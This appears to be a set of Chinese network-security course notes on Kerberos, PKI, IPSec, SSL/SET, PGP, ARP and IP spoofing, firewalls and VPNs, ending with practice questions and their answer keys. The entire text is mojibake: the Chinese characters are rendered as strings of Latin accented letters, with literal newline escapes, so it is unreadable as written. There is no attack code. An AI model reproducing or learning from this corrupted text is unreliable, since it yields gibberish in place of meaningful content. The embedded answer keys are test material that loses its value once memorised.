è®¾è®¡ä¸€ä¸ªæ»¡è¶³å®‰å…¨è¦æ±‚çš„è®¤è¯åè®®*\nã€‚ã€‚ã€‚ã€‚ã€‚ã€‚\n### Kerberosç³»ç»Ÿ\nä¸€ç§åŸºäºå¯¹ç§°å¯†é’¥ã€åœ¨ç½‘ç»œä¸Šå®æ–½èº«ä»½è®¤è¯çš„æœåŠ¡ã€‚åŒ…å«è®¤è¯æœåŠ¡å™¨(AS)å’Œé—¨ç¥¨æˆæƒæœåŠ¡å™¨ï¼ˆTGSï¼‰\n**è®¾è®¡ç›®çš„ï¼š**è§£å†³åˆ†å¸ƒå¼ç½‘ç»œç¯å¢ƒä¸‹ç”¨æˆ·è®¿é—®ç½‘ç»œèµ„æºæ—¶çš„å®‰å…¨é—®é¢˜\n![](https://i.loli.net/2019/11/11/QM35KG6YgHleNZ2.png)\n### PKIæŠ€æœ¯\nPKIæ˜¯åŸºäºå…¬é’¥å¯†ç æŠ€æœ¯ï¼Œæ”¯æŒå…¬é’¥ç®¡ç†ï¼Œæä¾›çœŸå®æ€§ã€ä¿å¯†æ€§ã€å®Œæ•´æ€§ä»¥åŠå¯è¿½ç©¶æ€§çš„å®‰å…¨æœåŠ¡ï¼Œå…·æœ‰æ™®é€‚æ€§çš„å®‰å…¨åŸºç¡€è®¾æ–½ã€‚\n**PKIæä¾›çš„æœåŠ¡ï¼š**\næ•°æ®ä¼ è¾“çš„æœºå¯†æ€§ï¼ˆé¿å…è¢«æˆªè·ï¼‰\næ•°æ®äº¤æ¢çš„å®Œæ•´æ€§ï¼ˆé¿å…è¢«ç¯¡æ”¹ï¼‰\nå‘é€ä¿¡æ¯çš„ä¸å¯å¦è®¤æ€§ï¼ˆé¿å…äº‹åä¸æ‰¿è®¤ï¼‰\näº¤æ˜“è€…èº«ä»½çš„ç¡®å®šæ€§ï¼ˆé¿å…è¢«å‡å†’ï¼‰\nç­¾åç§é’¥ä¸ºç¡®ä¿å…¶æ€§è€Œä¸èƒ½å¤Ÿä½œå¤‡ä»½ã€‚ä¸‡ä¸€CAå‡å†’\n## å…­ã€Internetå®‰å…¨\n### å„å±‚åè®®çš„å®‰å…¨\n![](https://i.loli.net/2019/11/07/JaphoPZ5LwRyHDm.png)\n![](https://i.loli.net/2019/11/07/5Df3rhlyw869AIW.png)\n![](https://i.loli.net/2019/11/07/jQtAeVJvSbnlGid.png)\n### IPSec\nIPSecå¯¹äºIPv4æ˜¯å¯é€‰çš„ï¼Œå¯¹äºIPv6æ˜¯å¼ºåˆ¶æ€§çš„ã€‚\n**IPSecçš„æ€æƒ³ï¼š**\nä½¿ç”¨IPå°è£…æŠ€æœ¯ï¼Œå¯¹çº¯æ–‡æœ¬çš„åŒ…åŠ å¯†ï¼Œå°è£…åœ¨å¤–å±‚çš„IPæ•°æ®æŠ¥çš„é¦–éƒ¨é‡Œï¼Œç”¨æ¥å¯¹åŠ å¯†çš„åŒ…è¿›è¡Œè·¯ç”±ã€‚åˆ°è¾¾æ¥æ”¶ç«¯æ—¶ï¼Œå¤–å±‚çš„IPæŠ¥å¤´è¢«æ‹†å¼€ï¼ŒæŠ¥æ–‡è¢«è§£å¯†ã€‚\n**IPSecçš„ç›®çš„ï¼š**\nä½¿éœ€è¦å®‰å…¨æªæ–½çš„ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨ç›¸åº”çš„åŠ å¯†å®‰å…¨ä½“åˆ¶ï¼Œä¸”è¯¥ä½“åˆ¶ä¸ç®—æ³•æ— å…³ï¼Œå³ä½¿æ›¿æ¢äº†åŠ å¯†ç®—æ³•ä¹Ÿä¸ä¼šå¯¹å…¶ä»–éƒ¨åˆ†äº§ç”Ÿå½±å“\n**IPSecçš„åŠŸèƒ½ï¼š**\nä¿è¯æ•°æ®æ¥æºå¯é ï¼ˆè®¤è¯ï¼‰\nä¿è¯æ•°æ®å®Œæ•´æ€§ï¼ˆéªŒè¯ç®—æ³•ï¼‰\nä¿è¯æ•°æ®æœºå¯†æ€§ï¼ˆåŠ å¯†ï¼‰\nå®ç°VPNï¼ˆéš§é“æ¨¡å¼ï¼‰\n**IPSecå·¥ä½œæ¨¡å¼å’Œè¿‡ç¨‹ï¼š**\n**å·¥ä½œæ¨¡å¼ï¼š**\n`ä¼ è¾“æ¨¡å¼`ï¼šç”¨äºç«¯åˆ°ç«¯çš„åº”ç”¨æ—¶ï¼Œä»…å¯¹æºç‚¹åšé‰´åˆ«å’Œå®Œæ•´æ€§ï¼Œæ²¡æœ‰æä¾›ä¿å¯†æ€§\n`éš§é“æ¨¡å¼`ï¼šç”¨äºé˜²ç«å¢™æˆ–å…¶ä»–å®‰å…¨ç½‘å…³ï¼Œä¿æŠ¤å†…éƒ¨ç½‘ç»œï¼Œéš”ç¦»å¤–éƒ¨ç½‘ç»œï¼Œä¸ä»…èƒ½æä¾›AHæä¾›çš„æºç‚¹é‰´åˆ«å’Œæ•°æ®å®Œæ•´æ€§ï¼Œè¿˜èƒ½æä¾›ä¿å¯†æ€§\n**AHåè®®ï¼š**\n![](https://i.loli.net/2019/11/08/Jcyv47M8DXfz5Ot.png)\n![](https://i.loli.net/2019/11/08/Cf3HdkZFMDzUSAm.png)\n**ESPåè®®ï¼š**\n![](https://i.loli.net/2019/11/08/6L2g5cAR3vTaN4O.png)\n![](https://i.loli.net/2019/11/08/vAIdWkcyoHUi1Bn.png)\n**IPSecå¯†é’¥ç®¡ç†ï¼š**\nIPSecçš„å®‰å…¨æœåŠ¡è¦æ±‚æ”¯æŒå…±äº«å¯†é’¥å®Œæˆè®¤è¯å’Œä¿å¯†\næ‰‹å·¥ç®¡ç†\nè‡ªåŠ¨ç®¡ç†\n```\nPhoturis\nç®€å•Internetå¯†é’¥ç®¡ç†åè®®SKIP\nInternetå¯†é’¥äº¤æ¢åè®®IKE\nIPSecé»˜è®¤çš„åè®®--IKE\n```\n**å› ç‰¹ç½‘å¯†é’¥äº¤æ¢åè®®IKE (Internet Key Exchange)**\nOakleyâ€”â€”å¯†é’¥ç”Ÿæˆåè®®\nå®‰å…¨å¯†é’¥äº¤æ¢æœºåˆ¶ SKEME (Secure Key Exchange Mechanism) â€”â€”ç”¨äºå¯†é’¥äº¤æ¢çš„åè®® \nå› ç‰¹ç½‘å®‰å…¨å…³è”å’Œå¯†é’¥ç®¡ç†åè®® ISAKMP (Internet Secure Association and Key Management Mechanism) â€”â€”ç”¨äºå®ç° IKE ä¸­å®šä¹‰çš„å¯†é’¥äº¤æ¢\n```\nIKEä¸­çš„å¯†é’¥äº¤æ¢åŸºäºDiffie-Hellmanå¯†é’¥äº¤æ¢ï¼š\n A â†’ B:  ga     \n B â†’ A:  gb  \n Bå’ŒAéƒ½èƒ½å¾—åˆ°ä¸€ä¸ªæ­£ç¡®ç›¸åŒçš„å€¼ï¼šgab ç”±äºè¯¥åè®®æ²¡æœ‰å®ç°å®ä½“è®¤è¯ï¼Œå®¹æ˜“å—åˆ°ä¸­é—´äººæ”»å‡»ï¼ˆman-in-middle attackï¼‰\nå®‰å…¨å¯†é’¥äº¤æ¢æœºåˆ¶SKEMEâ€”â€”ç”¨äºå¯†é’¥äº¤æ¢çš„åè®®ï¼Œåˆ©ç”¨å…¬é’¥åŠ å¯†æ¥å®ç°å¯†é’¥äº¤æ¢åè®®ä¸­çš„å®ä½“é‰´åˆ«ï¼ŒæŠµæŠ—DHå¯†é’¥äº¤æ¢ä¸­çš„ä¸­é—´äººæ”»å‡»\n```\n### SSL/SET\n**å®‰å…¨å¥—æ¥å±‚åè®®ï¼ˆSecure Socket Layer)ï¼š**\næ˜¯å¯¹è®¡ç®—æœºä¹‹é—´æ•´ä¸ªä¼šè¯è¿›è¡ŒåŠ å¯†çš„åè®®ï¼Œæä¾›äº†åŠ å¯†ã€è®¤è¯æœåŠ¡å’ŒæŠ¥æ–‡å®Œæ•´æ€§ã€‚å®ƒèƒ½å¤Ÿå¯¹ä¿¡ç”¨å¡å’Œä¸ªäººä¿¡æ¯æä¾›è¾ƒå¼ºçš„ä¿æŠ¤ã€‚SSLè¢«ç”¨ä»¥å®Œæˆéœ€è¦çš„å®‰å…¨äº¤æ˜“æ“ä½œã€‚åœ¨SSLä¸­ï¼Œé‡‡ç”¨äº†å…¬å¼€å¯†é’¥å’Œç§æœ‰å¯†é’¥ä¸¤ç§åŠ å¯†æ–¹æ³•ã€‚\næä¾›çš„æœåŠ¡ï¼šä¿å¯†æ€§ã€è®¤è¯æ€§ã€å®Œæ•´æ€§\nHTTPSæœåŠ¡ï¼šå½“å®¢æˆ·ç‚¹å‡»ç½‘ç«™é“¾æ¥å»ºç«‹TCPè¿æ¥åï¼Œå…ˆè¿›è¡Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ¡æ‰‹åè®®ï¼Œå®ŒæˆåŠ å¯†ç®—æ³•çš„åå•†å’Œä¼šè¯å¯†é’¥çš„ä¼ é€’ï¼Œç„¶åè¿›è¡Œå®‰å…¨æ•°æ®ä¼ è¾“ã€‚\n![](https://i.loli.net/2019/11/08/e1O5tUHWYboDqw2.png)\n**å®‰å…¨ç”µå­äº¤æ˜“åè®®ï¼ˆSecure Electronic Transactionï¼‰ï¼š**\nå®ƒæä¾›äº†æ¶ˆè´¹è€…ã€å•†å®¶å’Œé“¶è¡Œä¹‹é—´çš„è®¤è¯ï¼Œç¡®ä¿äº¤æ˜“çš„ä¿å¯†æ€§ã€å¯é æ€§å’Œä¸å¯å¦è®¤æ€§ï¼Œä»¥ä¿è¯æ”¯ä»˜ä¿¡æ¯çš„æœºå¯†ã€æ”¯ä»˜è¿‡ç¨‹çš„å®Œæ•´ã€å•†æˆ·åŠæŒå¡äººçš„åˆæ³•èº«ä»½ã€ä»¥åŠå¯æ“ä½œæ€§ã€‚SETä¸­çš„æ ¸å¿ƒæŠ€æœ¯ä¸»è¦æœ‰å…¬å¼€å¯†åŒ™åŠ å¯†ã€ç”µå­æ•°å­—ç­¾åã€ç”µå­ä¿¡å°ã€ç”µå­å®‰å…¨è¯ä¹¦ç­‰ã€‚\n**SSL:**\n![](https://i.loli.net/2019/11/08/VoMhKtk3IfigJXa.png)\n![](https://i.loli.net/2019/11/08/NgiLJ4dn8qh6UvP.png)\n**SET:**\n![](https://i.loli.net/2019/11/08/wdxmXtZGCibRLNP.png)\n![](https://i.loli.net/2019/11/08/fIl7P4ocj3Rg59r.png)\n```\nSSLä¸SETä¸¤ç§åè®®çš„åŒºåˆ«åœ¨å“ªé‡Œï¼ˆCï¼‰ã€‚\nA. åŠ å¯†æ–¹æ³•\nB. è§£å¯†æ–¹æ³•\nC. ç½‘ç»œä¸­çš„å±‚æ¬¡\nD. ä¿¡æ¯ä¼ è¾“çš„ä¿å¯†\n[è§£æ]SSLæ˜¯åŸºäºä¼ è¾“å±‚çš„åè®®ï¼Œè€ŒSETåˆ™æ˜¯åŸºäºåº”ç”¨å±‚çš„åè®®ã€‚\nSETåè®®è¿è¡Œçš„ç›®æ ‡ä¸»è¦æœ‰ï¼ˆA.Bï¼‰ã€‚\nAï¼ä¿è¯ä¿¡æ¯åœ¨äº’è”ç½‘ä¸Šå®‰å…¨ä¼ è¾“\nBï¼ä¿è¯ç”µå­å•†åŠ¡å‚ä¸è€…ä¿¡æ¯çš„ç›¸äº’éš”ç¦»\nCï¼æä¾›å•†å“æˆ–æœåŠ¡\nDï¼é€šè¿‡æ”¯ä»˜ç½‘å…³å¤„ç†æ¶ˆè´¹è€…å’Œåœ¨çº¿å•†åº—ä¹‹é—´çš„äº¤æ˜“ä»˜æ¬¾é—®é¢˜ \nSSLåè®®å¯¹äºSETåè®®çš„åŠ£åŠ¿ä¸»è¦æ˜¯æ— æ³•ä¿è¯ï¼šï¼ˆCï¼‰\nA.ä¿¡æ¯çš„çœŸå®æ€§\nB.ä¿¡æ¯çš„å®Œæ•´æ€§\nC.ä¿¡æ¯çš„ä¸å¯å¦è®¤æ€§\nD.ä¿¡æ¯çš„ä¿å¯†æ€§\n```\n### PGPæŠ€æœ¯\n![](https://i.loli.net/2019/11/08/SGhU97D1nZQvsAd.png)\n![](https://i.loli.net/2019/11/08/ReuxbTIk9HvBtwy.png)\n![](https://i.loli.net/2019/11/08/9fdP7xmsBghpeA8.png)\n![](https://i.loli.net/2019/11/08/abMhNxLCFe7ztZ4.png)\n![](https://i.loli.net/2019/11/08/fPYBXKvZ7q2A5gk.png)\n### ARPæ¬ºéª—\n![](https://ftp.bmp.ovh/imgs/2019/11/60fef59f64ac6ef3.png)\nARPæ”»å‡»å°±æ˜¯é€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€å®ç°ARPæ¬ºéª—ï¼Œèƒ½å¤Ÿåœ¨ç½‘ç»œä¸­äº§ç”Ÿå¤§é‡çš„ARPé€šä¿¡é‡ä½¿ç½‘ç»œé˜»å¡ï¼Œæ”»å‡»è€…åªè¦æŒç»­ä¸æ–­çš„å‘å‡ºä¼ªé€ çš„ARPå“åº”åŒ…å°±èƒ½æ›´æ”¹ç›®æ ‡ä¸»æœºARPç¼“å­˜ä¸­çš„IP-MACæ¡ç›®ï¼Œé€ æˆç½‘ç»œä¸­æ–­æˆ–ä¸­é—´äººæ”»å‡»ã€‚\n**åˆ†ç±»ï¼š**\né’ˆå¯¹ä¸»æœºçš„ARPæ¬ºéª—ï¼šå†’å……å…¶å®ƒä¸»æœºï¼Œæ¥æ”¶è¯¥ä¸»æœºçš„ä¿¡æ¯\né’ˆå¯¹äº¤æ¢æœºçš„ARPæ¬ºéª—ï¼šåˆ©ç”¨å·¥å…·äº§ç”Ÿæ¬ºéª—MACï¼Œå¹¶å¿«é€Ÿå¡«æ»¡äº¤æ¢æœºçš„MACåœ°å€è¡¨\n### IPæ¬ºéª—\nIPæ¬ºéª—ï¼šIPæ¬ºéª—æŒ‡æ”»å‡»è€…å‡å†’ä»–äººIPåœ°å€,å‘é€æ•°æ®åŒ…\nå› ä¸ºIPåè®®ä¸å¯¹æ•°æ®åŒ…ä¸­çš„IPåœ°å€è¿›è¡Œè®¤è¯, å› æ­¤ä»»ä½•äººä¸ç»æˆæƒå°±å¯ä¼ªé€ IPåŒ…çš„æºå€ã€‚\n**åˆ†ç±»ï¼š**\nåŸºæœ¬çš„IPæ¬ºéª—\nIPæ¬ºéª—çš„é«˜çº§åº”ç”¨â€”â€”TCPä¼šè¯åŠ«æŒ\n## ä¸ƒã€é˜²ç«å¢™æŠ€æœ¯\né˜²ç«å¢™å®ç°ä¸»è¦åŒ…æ‹¬è¿‡æ»¤æœºåˆ¶å’Œå®‰å…¨ç­–ç•¥\n### é˜²ç«å¢™çš„ç±»å‹ï¼š\n#### åŒ…è¿‡æ»¤è·¯ç”±å™¨\nç‰¹ç‚¹ï¼š\nåœ¨ç½‘ç»œå±‚ä¸Šè¿›è¡Œç›‘æµ‹\né€šå¸¸åœ¨è·¯ç”±å™¨ä¸Šå®ç°\n#### åº”ç”¨å±‚ç½‘å…³\nç‰¹ç‚¹ï¼š\næ‰€æœ‰çš„è¿æ¥éƒ½é€šè¿‡é˜²ç«å¢™ï¼Œé˜²ç«å¢™ä½œä¸ºç½‘å…³\nåœ¨åº”ç”¨å±‚ä¸Šå®ç°ï¼Œç½‘å…³ç†è§£åº”ç”¨åè®®ï¼Œå¯ä»¥å®æ–½æ›´ç»†ç²’åº¦çš„è®¿é—®æ§åˆ¶\nå¯ä»¥ç›‘è§†åŒ…çš„å†…å®¹\nå¯ä»¥å®ç°åŸºäºç”¨æˆ·çš„è®¤è¯\nå¯ä»¥æä¾›ç†æƒ³çš„æ—¥å¿—åŠŸèƒ½\nå¯¹æ¯ä¸€ç±»åº”ç”¨ï¼Œéƒ½éœ€è¦ä¸€ä¸ªä¸“é—¨çš„ä»£ç†ï¼Œä¸å¤Ÿçµæ´»\néå¸¸å®‰å…¨ï¼Œä½†æ˜¯å¼€é”€æ¯”è¾ƒå¤§\n#### ç”µè·¯å±‚ç½‘å…³\nç‰¹ç‚¹ï¼š\næ‹“æ‰‘ç»“æ„åŒåº”ç”¨ç¨‹åºç½‘å…³ç›¸åŒ\næ¥æ”¶å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚ï¼Œä»£ç†å®¢æˆ·ç«¯å®Œæˆç½‘ç»œè¿æ¥\nåœ¨å®¢æˆ·å’ŒæœåŠ¡å™¨é—´ä¸­è½¬æ•°æ®\né€šç”¨æ€§å¼º\n### é˜²ç«å¢™ä¸èƒ½æŠµæŠ—æ¥è‡ªå†…ç½‘çš„æ”»å‡»\n## å…«ã€VPNæŠ€æœ¯\n**VPNï¼ˆVirtual Private Networkï¼‰å®šä¹‰ï¼š**\nåˆ©ç”¨Internetæˆ–å…¶å®ƒå…¬å…±äº’è”ç½‘ç»œçš„åŸºç¡€è®¾æ–½ä¸ºç”¨æˆ·åˆ›å»ºéš§é“ï¼Œæ¥ä»¿çœŸä¸“æœ‰çš„å¹¿åŸŸç½‘ï¼Œå¹¶æä¾›ä¸ä¸“ç”¨ç½‘ç»œä¸€æ ·çš„å®‰å…¨å’ŒåŠŸèƒ½ä¿éšœ\n**VPNçš„ç›®çš„ï¼š**\nèµ„æºè®¿é—®é™åˆ¶äºæŸäº›IPåœ°å€\nå†…éƒ¨äººå‘˜éœ€è¦åœ¨å¤–é¢è®¿é—®å†…éƒ¨ç½‘\né›‡å‘˜å¯èƒ½åœ¨å¤–åœ°å¹¶éœ€è¦è®¿é—®ç½‘ç»œ\nä¸“æœ‰ç½‘å¤ªè´µ\nå¤–åœ°çš„é›‡å‘˜ä¹Ÿå¯èƒ½ä¸æ˜¯å®šç‚¹çš„\n**VPNç±»å‹ï¼š**\næŒ‰åº”ç”¨/æœåŠ¡ç±»å‹åˆ†ç±»ï¼š\nè¿œç¨‹è®¿é—®å‹VPNï¼š é€šè¿‡Internetæ¥çº³è¿œç¨‹ç”¨æˆ·\nLANé—´äº’è¿å‹VPNï¼šé€šè¿‡Internetè”ç»“ä¸¤ä¸ªæˆ–å¤šä¸ªLAN\næŒ‰å®ç°çš„å±‚æ¬¡åˆ†ç±»\näºŒå±‚éš§é“VPNï¼šPPTPã€L2TPã€OpenVPN\nä¸‰å±‚éš§é“VPNï¼šGREã€IPSec\n**VPNä½¿ç”¨çš„æŠ€æœ¯ï¼š**\néš§é“æŠ€æœ¯ï¼ˆTunnelingï¼‰\nåŠ è§£å¯†æŠ€æœ¯ï¼ˆEncryption & Decryptionï¼‰\nç”¨æˆ·èº«ä»½è®¤è¯/è®¿é—®æ§åˆ¶æŠ€æœ¯ï¼ˆIdentification/Access Controlï¼‰\nå¯†é’¥ç®¡ç†æŠ€æœ¯ï¼ˆKey Managementï¼‰\n\n----\n## æ¨¡æ‹Ÿè¯•é¢˜\n### ä¸€ã€é€‰æ‹©é¢˜\n**1.** ä»¥ä¸‹å…³äºå¯¹ç§°åŠ å¯†çš„è¯´æ³•ä¸æ­£ç¡®çš„æ˜¯ï¼ˆBï¼‰   \nAã€åœ¨å¯¹ç§°åŠ å¯†ä¸­ï¼Œåªæœ‰ä¸€ä¸ªå¯†é’¥ç”¨æ¥åŠ å¯†å’Œè§£å¯†ä¿¡æ¯\nBã€åœ¨å¯¹ç§°åŠ å¯†ä¸­ï¼Œç”¨åˆ°äº†äºŒä¸ªå¯†é’¥æ¥åŠ å¯†å’Œè§£å¯†ä¿¡æ¯ï¼Œåˆ†åˆ«æ˜¯å…¬å…±å¯†é’¥å’Œç§ç”¨å¯†é’¥\nCã€å¯¹ç§°åŠ å¯†æ˜¯ä¸€ä¸ªç®€å•çš„è¿‡ç¨‹ï¼ŒåŒæ–¹éƒ½å¿…éœ€å®Œå…¨ç›¸ä¿¡å¯¹æ–¹ï¼Œå¹¶æŒæœ‰è¿™ä¸ªå¯†é’¥çš„å¤‡ä»½\nDã€å¯¹ç§°åŠ å¯†çš„é€Ÿåº¦éå¸¸å¿«ï¼Œå…è®¸ä½ åŠ å¯†å¤§é‡çš„ä¿¡æ¯è€Œåªéœ€è¦å‡ ç§’é’Ÿ\n**2.** è¢«åŠ¨æ”»å‡»ä¸»è¦æ˜¯ç›‘è§†å…¬å…±åª’ä½“ä¼ è¾“çš„ä¿¡æ¯ï¼Œä¸‹åˆ—å±äºå…¸å‹è¢«åŠ¨æ”»å‡»çš„æ˜¯(B)\nAã€è§£å¯†é€šä¿¡æ•°æ®      Bã€ä¼šè¯æ‹¦æˆª      Cã€ç³»ç»Ÿå¹²æ¶‰        Dã€ä¿®æ”¹æ•°æ®\n**3.**\té’ˆå¯¹çªƒå¬æ”»å‡»é‡‡å–çš„å®‰å…¨æœåŠ¡æ˜¯(B)\nA.é‰´åˆ«æœåŠ¡       B.æ•°æ®æœºå¯†æ€§æœåŠ¡         C.æ•°æ®å®Œæ•´æ€§æœåŠ¡    D.æŠ—æŠµèµ–æœåŠ¡\n**4.**\tä»¥ä¸‹å±äºå¯¹ç§°åŠ å¯†ç®—æ³•çš„æ˜¯(A)\nAã€DES\nBã€MD5\nCã€HASH\nDã€RSA\n**5.**\tåœ¨ä¿è¯å¯†ç å®‰å…¨ä¸­ï¼Œæˆ‘ä»¬åº”é‡‡å–çš„æªæ–½ä¸­ä¸æ­£ç¡®çš„æ˜¯(D)\nAã€ä¸ç”¨ç”Ÿæ—¥åšå¯†ç \nBã€ä¸è¦ä½¿ç”¨å°‘äº8ä½çš„å¯†ç \nCã€å¯†ç ä¸èƒ½ä»¥ä»»ä½•æ˜æ–‡å½¢å¼å­˜åœ¨ä»»ä½•ç”µå­ä»‹è´¨ä¸­\nDã€ç”¨æˆ·å¯ä»¥ä¸æ–­åœ°å°è¯•å¯†ç è¾“å…¥ï¼Œç›´åˆ°æ­£ç¡®ä¸ºæ­¢\n**6.**\tå½“ä½ æ„Ÿè§‰åˆ°ä½ çš„Win2000è¿è¡Œé€Ÿåº¦æ˜æ˜¾å‡æ…¢ï¼Œå½“ä½ æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨åå‘ç°CPUçš„ä½¿ç”¨ç‡è¾¾åˆ°äº†ç™¾åˆ†ä¹‹ç™¾ï¼Œä½ æœ€æœ‰å¯èƒ½è®¤ä¸ºä½ å—åˆ°äº†å“ªä¸€ç§æ”»å‡»(B)ã€‚\nAã€ç‰¹æ´›ä¼Šæœ¨é©¬                Bã€æ‹’ç»æœåŠ¡          Cã€æ¬ºéª—          Dã€ä¸­é—´äººæ”»å‡»\n**7.**\tå…¥ä¾µæ£€æµ‹çš„ç›®çš„æ˜¯(B)\nAã€å®ç°å†…å¤–ç½‘éš”ç¦»ä¸è®¿é—®æ§åˆ¶\nBã€æä¾›å®æ—¶çš„æ£€æµ‹åŠé‡‡å–ç›¸åº”çš„é˜²æŠ¤æ‰‹æ®µï¼Œé˜»æ­¢é»‘å®¢çš„å…¥ä¾µ\nCã€è®°å½•ç”¨æˆ·ä½¿ç”¨è®¡ç®—æœºç½‘ç»œç³»ç»Ÿè¿›è¡Œæ‰€æœ‰æ´»åŠ¨çš„è¿‡ç¨‹\nDã€é¢„é˜²ã€æ£€æµ‹å’Œæ¶ˆé™¤ç—…æ¯’\n**8.**\tç½‘ç»œçš„å¯ç”¨æ€§æ˜¯æŒ‡ï¼ˆDï¼‰ã€‚\nAï¼ç½‘ç»œé€šä¿¡èƒ½åŠ›çš„å¤§å°\t\tBï¼ç”¨æˆ·ç”¨äºç½‘ç»œç»´ä¿®çš„æ—¶é—´\nCï¼ç½‘ç»œçš„å¯é æ€§   \t\tDï¼ç”¨æˆ·å¯åˆ©ç”¨ç½‘ç»œæ—¶é—´çš„ç™¾åˆ†æ¯”\n**9.**\tæ•°å­—è¯ä¹¦ä¸åŒ…å«ï¼ˆBï¼‰\nA.\té¢å‘æœºæ„çš„åç§°\tB. è¯ä¹¦æŒæœ‰è€…çš„ç§æœ‰å¯†é’¥ä¿¡æ¯\nC.  è¯ä¹¦çš„æœ‰æ•ˆæœŸ\t D. CA ç­¾å‘è¯ä¹¦æ—¶æ‰€ä½¿ç”¨çš„ç­¾åç®—æ³•\n**10.** å°æåœ¨ä½¿ç”¨Nmapå¯¹ç›®æ ‡ç½‘ç»œè¿›è¡Œæ‰«ææ—¶å‘ç°ï¼ŒæŸä¸€ä¸ªä¸»æœºå¼€æ”¾äº†25å’Œ110ç«¯å£ï¼Œæ­¤ä¸»æœºæœ€æœ‰å¯èƒ½æ˜¯ä»€ä¹ˆ(B)ï¼Ÿ \nAã€æ–‡ä»¶æœåŠ¡å™¨          Bã€é‚®ä»¶æœåŠ¡å™¨         Cã€WEBæœåŠ¡å™¨               Dã€DNSæœåŠ¡å™¨\n**11.**\tä½ æƒ³å‘ç°åˆ°è¾¾ç›®æ ‡ç½‘ç»œéœ€è¦ç»è¿‡å“ªäº›è·¯ç”±å™¨ï¼Œä½ åº”è¯¥ä½¿ç”¨ä»€ä¹ˆå‘½ä»¤ï¼Ÿ(C)  \nAã€ping            Bã€nslookup          Cã€traceroot                        Dã€ipconfig\n**12.**\tæ”¯æŒå®‰å…¨WEBæœåŠ¡çš„åè®®æ˜¯ï¼ˆAï¼‰ã€‚\nAã€HTTPS    Bã€WINS    Cã€SOAP    Dã€HTTP\n**13.**\tå®‰å…¨ç”µå­é‚®ä»¶ä½¿ç”¨ï¼ˆAï¼‰åè®®ã€‚\nAã€PGP    Bã€HTTPS    Cã€MIME    Dã€DES\n**14.**\tå…¬é’¥åŸºç¡€è®¾æ–½ï¼ˆPKIï¼‰çš„æ ¸å¿ƒç»„æˆéƒ¨åˆ†æ˜¯ï¼ˆAï¼‰\nAã€è®¤è¯æœºæ„CA     Bã€X.509æ ‡å‡†    Cã€å¯†é’¥å¤‡ä»½å’Œæ¢å¤    Dã€PKIåº”ç”¨æ¥å£ç³»ç»Ÿ\n**15.**\tåœ¨åœ¨Kerberos è®¤è¯ç³»ç»Ÿä¸­ï¼Œç”¨æˆ·é¦–å…ˆå‘ï¼ˆBï¼‰ç”³è¯·åˆå§‹ç¥¨æ®ï¼Œç„¶åä»ï¼ˆCï¼‰è·å¾—ä¼šè¯å¯†é’¥\nAã€åŸŸåæœåŠ¡å™¨     Bã€è®¤è¯æœåŠ¡å™¨AS     Cã€ç¥¨æ®æˆäºˆæœåŠ¡å™¨TGS    Dã€è®¤è¯ä¸­å¿ƒCA\n**16.**\tä»¥ä¸‹å…³äºVPNçš„è¯´æ³•ä¸­çš„å“ªä¸€é¡¹æ˜¯æ­£ç¡®çš„ï¼Ÿ(C) \nAã€VPNæ˜¯è™šæ‹Ÿä¸“ç”¨ç½‘çš„ç®€ç§°ï¼Œå®ƒåªèƒ½å¯¹ISPå®æ–½ç»´æŠ¤\nBã€VPNæ˜¯åªèƒ½åœ¨ç¬¬äºŒå±‚æ•°æ®é“¾è·¯å±‚ä¸Šå®ç°åŠ å¯†\nCã€IPSECä¹Ÿæ˜¯VPNçš„ä¸€ç§\nDã€VPNä½¿ç”¨é€šé“æŠ€æœ¯åŠ å¯†ï¼Œä½†æ²¡æœ‰èº«ä»½éªŒè¯åŠŸèƒ½\n### äºŒã€å¡«ç©ºé¢˜\n**1.**\tè®¡ç®—æœºå®‰å…¨ä¸»è¦ä¸ºäº†ä¿è¯è®¡ç®—æœºçš„`æœºå¯†æ€§`ã€`å®Œæ•´æ€§` å’Œ `å¯ç”¨æ€§`ã€‚\n**2.**\tå®‰å…¨æ”»å‡»åˆ†ä¸º`ä¸»åŠ¨`æ”»å‡»å’Œ `è¢«åŠ¨` æ”»å‡»ã€‚\n**3.**\tIPSecçš„ä¸¤ç§å·¥ä½œæ¨¡å¼æ˜¯ `éš§é“` æ¨¡å¼å’Œä¼ è¾“æ¨¡å¼ã€‚\n**4.**\tåœ¨ PKI/PMI ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªåˆæ³•ç”¨æˆ·åªæ‹¥æœ‰ä¸€ä¸ªå”¯ä¸€çš„ `å…¬é’¥è¯ä¹¦`\tï¼Œä½†å¯èƒ½ä¼šåŒæ—¶æ‹¥æœ‰å¤šä¸ªä¸åŒçš„`å±æ€§è¯ä¹¦`ã€‚\n**5.**\tSSL æ˜¯ä¸€ç§ç»¼åˆåˆ©ç”¨`å¯¹ç§°å¯†é’¥`å’Œ`éå¯¹ç§°å¯†é’¥`æŠ€æœ¯è¿›è¡Œå®‰å…¨é€šä¿¡çš„å·¥ä¸šæ ‡å‡†ã€‚\n**6.** VPN æ˜¯åˆ©ç”¨ Internet ç­‰`å…¬å…±ç½‘ç»œ`çš„åŸºç¡€è®¾æ–½ï¼Œé€šè¿‡`éš§é“`æŠ€æœ¯ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€æ¡ä¸ä¸“ç½‘ç›¸åŒçš„å®‰å…¨é€šé“ã€‚\n**7.**\tVPN ç³»ç»Ÿä¸­çš„ä¸‰ç§å…¸å‹æŠ€æœ¯åˆ†åˆ«æ˜¯`éš§é“æŠ€æœ¯` ã€`èº«ä»½è®¤è¯æŠ€æœ¯`å’Œ`åŠ å¯†æŠ€æœ¯`ã€‚\n**8.** ç›®å‰èº«ä»½è®¤è¯æŠ€æœ¯å¯åˆ†ä¸º PKI å’Œé PKI ä¸¤ç§ç±»å‹ï¼Œå…¶ä¸­åœ¨ VPN çš„ç”¨æˆ·èº«ä»½è®¤è¯ä¸­ä¸€èˆ¬é‡‡ç”¨`é\nPKI\t`è®¤è¯æ–¹å¼ï¼Œè€Œä¿¡æ¯è®¤è¯ä¸­é‡‡ç”¨`PKI`è®¤è¯æ–¹å¼ã€‚\n### 